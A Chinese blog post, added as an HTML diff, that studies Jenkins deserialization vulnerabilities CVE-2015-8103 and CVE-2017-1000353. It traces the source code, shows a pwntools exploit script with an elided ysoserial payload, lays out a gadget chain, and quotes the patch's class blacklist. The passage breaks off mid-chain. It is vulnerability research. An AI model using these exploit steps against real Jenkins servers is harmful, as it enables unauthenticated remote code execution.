@@ -1,0 +1,1566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Jenkins相关漏洞学习（一） - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 十一月 24日 2020, 2:30 下午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    6.5k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      33 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> Jenkins 历史漏洞学习记录。</p>
+<a id="more"></a>
+<hr>
+<h4 id="CVE-2015-8103"><a href="#CVE-2015-8103" class="headerlink" title="CVE-2015-8103"></a>CVE-2015-8103</h4><p>用 docker 开个 Jenkins 环境：</p>
+<pre><code class="bash">docker pull jenkins:1.625.1
+docker run -id --name jenkins -p 32770:8080 -p32771:50000 jenkins:1.625.1
+</code></pre>
+<p>然后从里面把 war 包拖出来解压打开。</p>
+<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>该漏洞发生在 Jenkins 的 cli 模块，访问可以在 HTTP Headers 中找到 cli 端口为 50000：</p>
+<pre><code class="http">HTTP/1.1 200 OK
+X-Content-Type-Options: nosniff
+Content-Encoding: gzip
+Expires: 0
+Cache-Control: no-cache,no-store,must-revalidate
+X-Hudson-Theme: default
+Content-Type: text/html;charset=UTF-8
+X-Hudson: 1.395
+X-Jenkins: 1.625.1
+X-Jenkins-Session: 326782aa
+X-Hudson-CLI-Port: 50000
+X-Jenkins-CLI-Port: 50000
+X-Jenkins-CLI2-Port: 50000
+X-Frame-Options: sameorigin
+X-Instance-Identity: ...
+X-SSH-Endpoint: ...
+Content-Length: 3221
+Server: Jetty(winstone-2.8)
+</code></pre>
+<p>这个端口是由 TcpSlaveAgentListener 对象监听的一个 TCP 端口：</p>
+<pre><code class="java">public TcpSlaveAgentListener(int port) throws IOException {
+    super(&quot;TCP slave agent listener port=&quot; + port);
+
+    try {
+        this.serverSocket = ServerSocketChannel.open();
+        this.serverSocket.socket().bind(new InetSocketAddress(port));
+    } catch (BindException var3) {
+        ...
+    }
+
+    this.configuredPort = port;
+    LOGGER.log(Level.FINE, &quot;JNLP slave agent listener started on TCP port {0}&quot;, this.getPort());
+    this.start();
+}
+</code></pre>
+<p>其 run 函数如下：</p>
+<pre><code class="java">public void run() {
+    try {
+        while(true) {
+            Socket s = this.serverSocket.accept().socket();
+            s.setKeepAlive(true);
+            s.setTcpNoDelay(true);
+            (new TcpSlaveAgentListener.ConnectionHandler(s)).start();
+        }
+    } catch (IOException var2) {
+        if (!this.shuttingDown) {
+            LOGGER.log(Level.SEVERE, &quot;Failed to accept JNLP slave agent connections&quot;, var2);
+        }
+
+    }
+}
+</code></pre>
+<p>接收到一个 TCP 连接后交给 ConnectionHandler 对象处理：</p>
+<pre><code class="java">public ConnectionHandler(Socket s) {
+    this.s = s;
+    synchronized(this.getClass()) {
+        this.id = TcpSlaveAgentListener.iotaGen++;
+    }
+
+    this.setName(&quot;TCP slave agent connection handler #&quot; + this.id + &quot; with &quot; + s.getRemoteSocketAddress());
+}
+
+public void run() {
+    try {
+        TcpSlaveAgentListener.LOGGER.info(&quot;Accepted connection #&quot; + this.id + &quot; from &quot; + this.s.getRemoteSocketAddress());
+        DataInputStream in = new DataInputStream(this.s.getInputStream());
+        PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(this.s.getOutputStream(), &quot;UTF-8&quot;)), true);
+        String s = in.readUTF();
+        if (s.startsWith(&quot;Protocol:&quot;)) {
+            String protocol = s.substring(9);
+            AgentProtocol p = AgentProtocol.of(protocol);
+            if (p != null) {
+                p.handle(this.s);
+            } else {
+                this.error(out, &quot;Unknown protocol:&quot; + s);
+            }
+        } else {
+            this.error(out, &quot;Unrecognized protocol: &quot; + s);
+        }
+    } catch (InterruptedException var8) {
+        ...
+    } catch (IOException var9) {
+        ...
+    }
+
+}
+</code></pre>
+<p>从传输数据中读取一个字符串 “Protocol:”，然后从其后面读取协议名并调用相应协议的 handler 函数，这里传入 “CLI-connect” 进入 CliProtocol 类：</p>
+<pre><code class="java">public void handle(Socket socket) throws IOException, InterruptedException {
+    (new CliProtocol.Handler(this.nio.getHub(), socket)).run();
+}
+</code></pre>
+<p>然后：</p>
+<pre><code class="java">public Handler(NioChannelHub hub, Socket socket) {
+    this.hub = hub;
+    this.socket = socket;
+}
+
+public void run() throws IOException, InterruptedException {
+    PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(this.socket.getOutputStream(), &quot;UTF-8&quot;)), true);
+    out.println(&quot;Welcome&quot;);
+    this.runCli(new Connection(this.socket));
+}
+
+protected void runCli(Connection c) throws IOException, InterruptedException {
+    String name = &quot;CLI channel from &quot; + this.socket.getInetAddress();
+    ChannelBuilder cb = new ChannelBuilder(name, Computer.threadPoolForRemoting);
+    Channel channel = cb.withMode(Mode.BINARY).withRestricted(true).withBaseLoader(Jenkins.getInstance().pluginManager.uberClassLoader).build(new BufferedInputStream(c.in), new BufferedOutputStream(c.out));
+    channel.setProperty(CliEntryPoint.class.getName(), new CliManagerImpl(channel));
+    channel.join();
+}
+</code></pre>
+<p>在 runCli 函数中会调用 ChannelBuilder 类的 build 函数：</p>
+<pre><code class="java">for(int i = 0; i &lt; preambles.length; ++i) {
+    byte[] preamble = preambles[i];
+    if (preamble[ptr[i]] == ch) {
+        if (++ptr[i] == preamble.length) {
+            switch(i) {
+                case 0:
+                case 1:
+                    if (mode == Mode.NEGOTIATE) {
+                        mode = modes[i];
+                        os.write(mode.preamble);
+                        os.flush();
+                    } else if (modes[i] != mode) {
+                        throw new IOException(&quot;Protocol negotiation failure&quot;);
+                    }
+
+                    return this.makeTransport(is, os, mode, cap);
+                case 2:
+                    cap = Capability.read(is);
+                default:
+                    ptr[i] = 0;
+            }
+        }
+    } else {
+        ptr[i] = 0;
+    }
+}
+</code></pre>
+<p>会跟三个 preambles 进行比较，然后做相应的操作，可以看到当符合第三个 preamble 时，会调用 Capability.read，第三个 preamble 为：</p>
+<pre><code class="java">PREAMBLE = &quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;.getBytes(&quot;UTF-8&quot;);
+</code></pre>
+<p>而 Capability.read 函数如下：</p>
+<pre><code class="java">public static Capability read(InputStream is) throws IOException {
+    try {
+        ObjectInputStream ois = new ObjectInputStream(Mode.TEXT.wrap(is));
+        return (Capability)ois.readObject();
+    } catch (ClassNotFoundException var2) {
+        throw (Error)(new NoClassDefFoundError(var2.getMessage())).initCause(var2);
+    }
+}
+</code></pre>
+<p>会进行 Java 反序列化，而观察 Jenkins 项目中 lib 目录下的 jar，可以发现里面存在 commons-collections-3.2.1.jar，所以可以用 ysoserial 生成序列化攻击链。</p>
+<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>用 pwntools 写个简单的交互脚本：</p>
+<pre><code class="python">from pwn import *
+import base64
+
+context.log_level = &quot;debug&quot;
+target = remote(&quot;...&quot;, 50000)
+
+protocol = &quot;Protocol:CLI-connect&quot;
+target.send(&quot;\x00&quot; + chr(len(protocol)) + protocol)
+target.recv()
+pause()
+payload = &quot;aced...787878&quot;.decode(&quot;hex&quot;)
+payload = base64.b64encode(payload)
+target.send(&quot;&lt;===[JENKINS REMOTING CAPACITY]===&gt;&quot;)
+target.send(payload)
+pause()
+
+target.interactive()
+target.close()
+</code></pre>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>在往后的版本（2.46.1）中流程发生了变化，不过逻辑变化不大，最后在 Capability.read 中：</p>
+<pre><code class="java">public static Capability read(InputStream is) throws IOException {
+    try {
+        ObjectInputStream ois = new ObjectInputStream(Channel.Mode.TEXT.wrap(is)) {
+            protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+                String n = desc.getName();
+                if (!n.equals(&quot;java.lang.String&quot;) &amp;&amp; !n.equals(&quot;[Ljava.lang.String;&quot;) &amp;&amp; !n.equals(Capability.class.getName())) {
+                    throw new SecurityException(&quot;Rejected: &quot; + n);
+                } else {
+                    return super.resolveClass(desc);
+                }
+            }
+        };
+        return (Capability)ois.readObject();
+    } catch (ClassNotFoundException var2) {
+        throw (Error)(new NoClassDefFoundError(var2.getMessage())).initCause(var2);
+    }
+}
+</code></pre>
+<p>对反序列化的类做了限制，只允许 String、String 数组 和 Capability。</p>
+<p>除此之外，还将其他很多反序列化点的 ObjectInputStream 类修改为 ObjectInputStreamEx，其 resolveClass 函数如下：</p>
+<pre><code class="java">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+    String name = desc.getName();
+
+    try {
+        return this.filter.check(Class.forName(this.filter.check(name), false, this.cl));
+    } catch (ClassNotFoundException var4) {
+        return super.resolveClass(desc);
+    }
+}
+</code></pre>
+<p>简单来说就是一个正则一样的黑名单，其值如下：</p>
+<pre><code class="java">private static final String[] DEFAULT_PATTERNS = new String[]{
+    &quot;^bsh[.].*&quot;, 
+    &quot;^com[.]google[.]inject[.].*&quot;, 
+    &quot;^com[.]mchange[.]v2[.]c3p0[.].*&quot;, 
+    &quot;^com[.]sun[.]jndi[.].*&quot;, 
+    &quot;^com[.]sun[.]corba[.].*&quot;, 
+    &quot;^com[.]sun[.]javafx[.].*&quot;, 
+    &quot;^com[.]sun[.]org[.]apache[.]regex[.]internal[.].*&quot;, 
+    &quot;^java[.]awt[.].*&quot;, 
+    &quot;^java[.]rmi[.].*&quot;, 
+    &quot;^javax[.]management[.].*&quot;, 
+    &quot;^javax[.]naming[.].*&quot;, 
+    &quot;^javax[.]script[.].*&quot;, 
+    &quot;^javax[.]swing[.].*&quot;, 
+    &quot;^org[.]apache[.]commons[.]beanutils[.].*&quot;, 
+    &quot;^org[.]apache[.]commons[.]collections[.]functors[.].*&quot;, 
+    &quot;^org[.]apache[.]myfaces[.].*&quot;, 
+    &quot;^org[.]apache[.]wicket[.].*&quot;, 
+    &quot;.*org[.]apache[.]xalan.*&quot;, 
+    &quot;^org[.]codehaus[.]groovy[.]runtime[.].*&quot;, 
+    &quot;^org[.]hibernate[.].*&quot;, 
+    &quot;^org[.]python[.].*&quot;, 
+    &quot;^org[.]springframework[.](?!(\\p{Alnum}+[.])*\\p{Alnum}*Exception$).*&quot;, 
+    &quot;^sun[.]rmi[.].*&quot;, 
+    &quot;^javax[.]imageio[.].*&quot;, 
+    &quot;^java[.]util[.]ServiceLoader$&quot;, 
+    &quot;^java[.]net[.]URLClassLoader$&quot;
+};
+</code></pre>
+<h4 id="CVE-2017-1000353"><a href="#CVE-2017-1000353" class="headerlink" title="CVE-2017-1000353"></a>CVE-2017-1000353</h4><pre><code class="bash">docker pull jenkins:2.46.1
+</code></pre>
+<h5 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p><a href="https://ssd-disclosure.com/ssd-advisory-cloudbees-jenkins-unauthenticated-code-execution/" target="_blank" rel="noopener">参考文章</a>中给出了 payload，该漏洞与 CVE-2015-8103 类似，这次是从 HTTP 访问 cli 触发的漏洞，处理代码在 CLIAction$CliEndpointResponse 类的 generateResponse 函数中：</p>
+<pre><code class="java">public void generateResponse(StaplerRequest req, StaplerResponse rsp, Object node) throws IOException, ServletException {
+    try {
+        UUID uuid = UUID.fromString(req.getHeader(&quot;Session&quot;));
+        rsp.setHeader(&quot;Hudson-Duplex&quot;, &quot;&quot;);
+        if (req.getHeader(&quot;Side&quot;).equals(&quot;download&quot;)) {
+            FullDuplexHttpChannel server;
+            CLIAction.this.duplexChannels.put(uuid, server = new FullDuplexHttpChannel(uuid, !Jenkins.getActiveInstance().hasPermission(Jenkins.ADMINISTER)) {
+                protected void main(Channel channel) throws IOException, InterruptedException {
+                    channel.setProperty(CLICommand.TRANSPORT_AUTHENTICATION, Jenkins.getAuthentication());
+                    channel.setProperty(CliEntryPoint.class.getName(), new CliManagerImpl(channel));
+                }
+            });
+
+            try {
+                server.download(req, rsp);
+            } finally {
+                CLIAction.this.duplexChannels.remove(uuid);
+            }
+        } else {
+            ((FullDuplexHttpChannel)CLIAction.this.duplexChannels.get(uuid)).upload(req, rsp);
+        }
+
+    } catch (InterruptedException var10) {
+        throw new IOException(var10);
+    }
+}
+</code></pre>
+<p>可以看到，Jenkins 通过一个头 Session 决定一个通信频道，然后根据另一个头 Side 的不同，在同一个频道中会有 upload 和 download 两种处理方式，download 的处理会调用 download 函数，其中一部分代码如下：</p>
+<pre><code class="java">while(this.upload == null &amp;&amp; System.currentTimeMillis() &lt; end) {
+    this.wait(1000L);
+}
+
+if (this.upload == null) {
+    throw new IOException(&quot;HTTP full-duplex channel timeout: &quot; + this.uuid);
+} else {
+    ...
+}
+</code></pre>
+<p>可以看到，download 会挂起等待一段时间，直到 upload 属性被赋值才会进行下一步操作。回去看看 upload 的处理：</p>
+<pre><code class="java">public synchronized void upload(StaplerRequest req, StaplerResponse rsp) throws InterruptedException, IOException {
+    rsp.setStatus(200);
+    InputStream in = req.getInputStream();
+    if (DIY_CHUNKING) {
+        in = new ChunkedInputStream((InputStream)in);
+    }
+
+    this.upload = (InputStream)in;
+    this.notify();
+
+    while(!this.completed) {
+        this.wait();
+    }
+
+}
+</code></pre>
+<p>从 upload 中读取输入流，然后放入 upload 属性中。upload 结束后再回到 download：</p>
+<pre><code class="java">try {
+    this.channel = new Channel(&quot;HTTP full-duplex channel &quot; + this.uuid, Computer.threadPoolForRemoting, Mode.BINARY, this.upload, (OutputStream)out, (OutputStream)null, this.restricted);
+    ...
+} finally {
+    this.completed = true;
+    this.notify();
+}
+</code></pre>
+<p>实例化了一个 Channel 类，其构造函数是一个套娃过程，其中一步如下：</p>
+<pre><code class="java">Channel(ChannelBuilder settings, InputStream is, OutputStream os) throws IOException {
+    this(settings, settings.negotiate(is, os));
+}
+</code></pre>
+<p>negotiate 函数就是 CVE-2015-8103 的反序列化触发点，不过那个触发点已经被修复了，这次走的是另一条路，现版本的 switch 代码块如下：</p>
+<pre><code class="java">switch(i) {
+    case 0:
+    case 1:
+        LOGGER.log(Level.FINER, &quot;Received mode preamble: {0}&quot;, modes[i]);
+        if (mode == Mode.NEGOTIATE) {
+            mode = modes[i];
+            LOGGER.log(Level.FINER, &quot;Sending agreed mode preamble: {0}&quot;, mode);
+            os.write(mode.preamble);
+            os.flush();
+        } else if (modes[i] != mode) {
+            throw new IOException(&quot;Protocol negotiation failure&quot;);
+        }
+
+        LOGGER.log(Level.FINE, &quot;Channel name {0} negotiated mode {1} with capability {2}&quot;, new Object[]{this.name, mode, cap});
+        return this.makeTransport(is, os, mode, cap);
+    case 2:
+        cap = Capability.read(is);
+        LOGGER.log(Level.FINER, &quot;Received capability preamble: {0}&quot;, cap);
+        ptr[i] = 0;
+        break;
+    default:
+        throw new IllegalStateException(&quot;Unexpected preamble byte #&quot; + i + &quot;. Only &quot; + preambles.length + &quot; bytes are supported&quot;);
+}
+</code></pre>
+<p>可以看到，当 i 为 0、1 时，返回值来自 makeTransport 函数：</p>
+<pre><code class="java">protected CommandTransport makeTransport(InputStream is, OutputStream os, Mode mode, Capability cap) throws IOException {
+    FlightRecorderInputStream fis = new FlightRecorderInputStream(is);
+    if (cap.supportsChunking()) {
+        return new ChunkedCommandTransport(cap, mode.wrap(fis), mode.wrap(os), os);
+    } else {
+        ObjectOutputStream oos = new ObjectOutputStream(mode.wrap(os));
+        oos.flush();
+        return new ClassicCommandTransport(new ObjectInputStreamEx(mode.wrap(fis), this.getBaseLoader(), this.getClassFilter()), oos, fis, os, cap);
+    }
+}
+</code></pre>
+<p>因为此处的 cap 可以由 Capability.read 反序列化而成，所以这里简单来说就是一个 ClassicCommandTransport 对象，回到 Channel 的构造函数中，最后一步如下：</p>
+<pre><code class="java">protected Channel(ChannelBuilder settings, CommandTransport transport) throws IOException {
+    ...
+    if (this.internalExport(IChannel.class, this, false) != 1) {
+        throw new AssertionError();
+    } else {
+        ...
+        transport.setup(this, new CommandReceiver() {
+            public void handle(Command cmd) {
+                Channel.this.commandsReceived++;
+                Channel.this.lastCommandReceivedAt = System.currentTimeMillis();
+                if (Channel.logger.isLoggable(Level.FINE)) {
+                    Channel.logger.fine(&quot;Received &quot; + cmd);
+                }
+
+                try {
+                    cmd.execute(Channel.this);
+                } catch (Throwable var3) {
+                    Channel.logger.log(Level.SEVERE, &quot;Failed to execute command &quot; + cmd + &quot; (channel &quot; + Channel.this.name + &quot;)&quot;, var3);
+                    Channel.logger.log(Level.SEVERE, &quot;This command is created here&quot;, cmd.createdAt);
+                }
+
+            }
+
+            public void terminate(IOException e) {
+                Channel.this.terminate(e);
+            }
+        });
+        ACTIVE_CHANNELS.put(this, this.ref());
+    }
+}
+</code></pre>
+<p>transport 即上面的 ClassicCommandTransport 对象，下一步调用其 setup 函数：</p>
+<pre><code class="java">public void setup(Channel channel, CommandReceiver receiver) {
+    this.channel = channel;
+    (new SynchronousCommandTransport.ReaderThread(receiver)).start();
+}
+</code></pre>
+<p>ReaderThread 类的 run 函数一部分如下：</p>
+<pre><code class="java">cmd = SynchronousCommandTransport.this.read();
+</code></pre>
+<p>调用的 read 来自 ClassicCommandTransport 类：</p>
+<pre><code class="java">public final Command read() throws IOException, ClassNotFoundException {
+    try {
+        Command cmd = Command.readFrom(this.channel, this.ois);
+        if (this.rawIn != null) {
+            this.rawIn.clear();
+        }
+
+        return cmd;
+    } 
+    ...
+}
+</code></pre>
+<p>最后来到 Command.readFrom：</p>
+<pre><code class="java">static Command readFrom(Channel channel, ObjectInputStream ois) throws IOException, ClassNotFoundException {
+    Channel old = Channel.setCurrent(channel);
+
+    Command var3;
+    try {
+        var3 = (Command)ois.readObject();
+    } finally {
+        Channel.setCurrent(old);
+    }
+
+    return var3;
+}
+</code></pre>
+<p>可以看到另一个没有那么严格限制的反序列化点，不过这里的 ois 来自前面实例化 ClassicCommandTransport 对象时传入的 ObjectInputStreamEx 对象，也就是说这个反序列化点存在 CVE-2015-8103 的修复方式中提到的黑名单校验。所以要通过这个反序列化点进行反序列化攻击，还需要想点别的办法，比如某个可序列化类中会自己实例化一个 ObjectInputStream 然后输入一些可控字符 再 readObject 一下。</p>
+<p>而 JDK 中正好有一个类 SignedObject，其 getObject 函数如下：</p>
+<pre><code class="java">public Object getObject()
+    throws IOException, ClassNotFoundException
+{
+    // creating a stream pipe-line, from b to a
+    ByteArrayInputStream b = new ByteArrayInputStream(this.content);
+    ObjectInput a = new ObjectInputStream(b);
+    Object obj = a.readObject();
+    b.close();
+    a.close();
+    return obj;
+}
+</code></pre>
+<p>问题在于这个类没有继承什么接口，也没有调用其 getObject 函数的地方，所以要连接成反序列化链就需要找到一个反射操作的地方。</p>
+<p>光 JDK 内部是没有这种类的，不过 Jenkins 内有个 JSONObject 类，其 defaultBeanProcessing 函数如下：</p>
+<pre><code class="java">private static JSONObject defaultBeanProcessing(Object bean, JsonConfig jsonConfig) {
+    ...
+
+    PropertyDescriptor[] pds = PropertyUtils.getPropertyDescriptors(bean);
+    PropertyFilter jsonPropertyFilter = jsonConfig.getJsonPropertyFilter();
+
+    String key;
+    for(int i = 0; i &lt; pds.length; ++i) {
+        boolean bypass = false;
+        String key = pds[i].getName();
+        if (!exclusions.contains(key) &amp;&amp; (!jsonConfig.isIgnoreTransientFields() || !isTransientField(key, beanClass, jsonConfig))) {
+            Class type = pds[i].getPropertyType();
+
+            try {
+                pds[i].getReadMethod();
+            } catch (Exception var17) {
+                ...
+            }
+
+            if (pds[i].getReadMethod() != null) {
+                if (!isTransient(pds[i].getReadMethod(), jsonConfig)) {
+                    Object value = PropertyUtils.getProperty(bean, key);
+                    ...
+                }
+            }
+        }
+    }
+
+    ...
+}
+</code></pre>
+<p>可以看到，这里会调用 getPropertyDescriptors 获取某个类中的属性描述符，经过测试可以发现，除了类中定义好的属性，getXXX 函数也会被 getPropertyDescriptors 函数认为是一个属性，所以可以通过 defaultBeanProcessing 函数调用 getObject。</p>
+<p>继续往上，_fromBean：</p>
+<pre><code class="java">private static JSONObject _fromBean(Object bean, JsonConfig jsonConfig) {
+    if (!addInstance(bean)) {
+        ...
+    } else {
+        fireObjectStartEvent(jsonConfig);
+        JsonBeanProcessor processor = jsonConfig.findJsonBeanProcessor(bean.getClass());
+        JSONObject json;
+        if (processor != null) {
+            ...
+        } else {
+            json = defaultBeanProcessing(bean, jsonConfig);
+            removeInstance(bean);
+            fireObjectEndEvent(jsonConfig);
+            return json;
+        }
+    }
+}
+</code></pre>
+<p>继续：</p>
+<pre><code class="java">public static JSONObject fromObject(Object object, JsonConfig jsonConfig) {
+    if (object != null &amp;&amp; !JSONUtils.isNull(object)) {
+        if (object instanceof Enum) {
+            throw new JSONException(&quot;&#39;object&#39; is an Enum. Use JSONArray instead&quot;);
+        } else if (!(object instanceof Annotation) &amp;&amp; !object.getClass().isAnnotation()) {
+            if (object instanceof JSONObject) {
+                return _fromJSONObject((JSONObject)object, jsonConfig);
+            } else if (object instanceof DynaBean) {
+                return _fromDynaBean((DynaBean)object, jsonConfig);
+            } else if (object instanceof JSONTokener) {
+                return _fromJSONTokener((JSONTokener)object, jsonConfig);
+            } else if (object instanceof JSONString) {
+                return _fromJSONString((JSONString)object, jsonConfig);
+            } else if (object instanceof Map) {
+                return _fromMap((Map)object, jsonConfig);
+            } else if (object instanceof String) {
+                return _fromString((String)object, jsonConfig);
+            } else if (!JSONUtils.isNumber(object) &amp;&amp; !JSONUtils.isBoolean(object) &amp;&amp; !JSONUtils.isString(object)) {
+                if (JSONUtils.isArray(object)) {
+                    throw new JSONException(&quot;&#39;object&#39; is an array. Use JSONArray instead&quot;);
+                } else {
+                    return _fromBean(object, jsonConfig);
+                }
+            } else {
+                return new JSONObject();
+            }
+        } else {
+            throw new JSONException(&quot;&#39;object&#39; is an Annotation.&quot;);
+        }
+    } else {
+        return new JSONObject(true);
+    }
+}
+</code></pre>
+<p>fromObject 会判断 Object 的类型并做相应处理，SignedObject 类最后会进入 _fromBean 函数。继续往上：</p>
+<pre><code class="java">protected Object _processValue(Object value, JsonConfig jsonConfig) {
+    if (JSONNull.getInstance().equals(value)) {
+        return JSONNull.getInstance();
+    } else if (!Class.class.isAssignableFrom(value.getClass()) &amp;&amp; !(value instanceof Class)) {
+        if (value instanceof JSONFunction) {
+            return value;
+        } else if (value instanceof JSONString) {
+            return JSONSerializer.toJSON((JSONString)value, jsonConfig);
+        } else if (value instanceof JSON) {
+            return JSONSerializer.toJSON(value, jsonConfig);
+        } else if (JSONUtils.isArray(value)) {
+            return JSONArray.fromObject(value, jsonConfig);
+        } else if (JSONUtils.isString(value)) {
+            return value.toString();
+        } else if (JSONUtils.isNumber(value)) {
+            JSONUtils.testValidity(value);
+            return JSONUtils.transformNumber((Number)value);
+        } else if (JSONUtils.isBoolean(value)) {
+            return value;
+        } else {
+            JSONObject jsonObject = JSONObject.fromObject(value, jsonConfig);
+            return jsonObject.isNullObject() ? JSONNull.getInstance() : jsonObject;
+        }
+    } else {
+        return ((Class)value).getName();
+    }
+}
+</code></pre>
+<p>AbstractJSON 类的 _processValue 函数，再往上：</p>
+<pre><code class="java">private JSONArray addValue(Object value, JsonConfig jsonConfig) {
+    return this._addValue(this.processValue(value, jsonConfig), jsonConfig);
+}
+
+private Object processValue(Object value, JsonConfig jsonConfig) {
+    if (value != null) {
+        JsonValueProcessor jsonValueProcessor = jsonConfig.findJsonValueProcessor(value.getClass());
+        if (jsonValueProcessor != null) {
+            value = jsonValueProcessor.processArrayValue(value, jsonConfig);
+            if (!JsonVerifier.isValidJsonValue(value)) {
+                throw new JSONException(&quot;Value is not a valid JSON value. &quot; + value);
+            }
+        }
+    }
+
+    return this._processValue(value, jsonConfig);
+}
+
+protected Object _processValue(Object value, JsonConfig jsonConfig) {
+    if (value instanceof JSONTokener) {
+        return _fromJSONTokener((JSONTokener)value, jsonConfig);
+    } else if (value != null &amp;&amp; Enum.class.isAssignableFrom(value.getClass())) {
+        return ((Enum)value).name();
+    } else if (!(value instanceof Annotation) &amp;&amp; (value == null || !value.getClass().isAnnotation())) {
+        return super._processValue(value, jsonConfig);
+    } else {
+        throw new JSONException(&quot;Unsupported type&quot;);
+    }
+}
+</code></pre>
+<p>JSONArray 类，它继承了 AbstractJSON 类，其 addValue 函数最后会调用父类 AbstractJSON 的 _processValue 函数，继续往上，其 _fromCollection 函数中：</p>
+<pre><code class="java">int i = 0;
+Iterator elements = collection.iterator();
+
+while(elements.hasNext()) {
+    Object element = elements.next();
+    jsonArray.addValue(element, jsonConfig);
+    fireElementAddedEvent(i, jsonArray.get(i++), jsonConfig);
+}
+</code></pre>
+<p>遍历第一个参数 collection，然后调用 addValue。再往上，其 fromObject 函数中：</p>
+<pre><code class="java">public static JSONArray fromObject(Object object, JsonConfig jsonConfig) {
+    if (object instanceof JSONString) {
+        return _fromJSONString((JSONString)object, jsonConfig);
+    } else if (object instanceof JSONArray) {
+        return _fromJSONArray((JSONArray)object, jsonConfig);
+    } else if (object instanceof Collection) {
+        return _fromCollection((Collection)object, jsonConfig);
+    } 
+    ...
+}
+</code></pre>
+<p>如果参数 Object 为 Collection 类型，就会调用 _fromCollection。再往上：</p>
+<pre><code class="java">public boolean containsAll(Collection collection) {
+    return this.containsAll(collection, new JsonConfig());
+}
+
+public boolean containsAll(Collection collection, JsonConfig jsonConfig) {
+    return this.elements.containsAll(fromObject(collection, jsonConfig));
+}
+</code></pre>
+<p>containsAll 是 List/Collection 接口里面的函数，后面的链就好找多了。</p>
+<p>ConcurrentSkipListSet 类的 equals 函数如下：</p>
